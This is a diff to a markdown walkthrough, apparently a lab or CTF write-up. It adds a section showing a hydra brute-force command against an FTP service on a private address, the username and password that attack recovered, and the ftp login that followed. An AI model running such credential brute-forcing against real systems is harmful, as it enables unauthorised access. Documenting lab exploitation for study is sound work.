@@ -1,6 +1,6 @@
 <h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/8309287c-1280-4c6c-aab7-4751ac0c2279"></picture></h1>
 
-<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>DISCOVERING</h2>
+<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>DISCOVERING</h1>
 
 ```bash
 arp-scan -I eth0 --localnet --ignoredups
@@ -66,7 +66,21 @@ getdompwinfo
 
 ### **we found nothing**
 
+<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 21</h2>
 
+### **Brute Force**
+```bash
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt ftp://192.168.1.180
+```
+![image](https://github.com/user-attachments/assets/f87eb6f4-5b0e-4b8e-bcba-339876bf1268)
 
+USER:    info
+PASSWD:  PolniyPizdec0211
+
+### ** FTP Connection**
+```bash
+ftp 192.168.1.180
+```
+![image](https://github.com/user-attachments/assets/deac17fa-b655-4e1a-b01d-190d7f24df61)
 
 
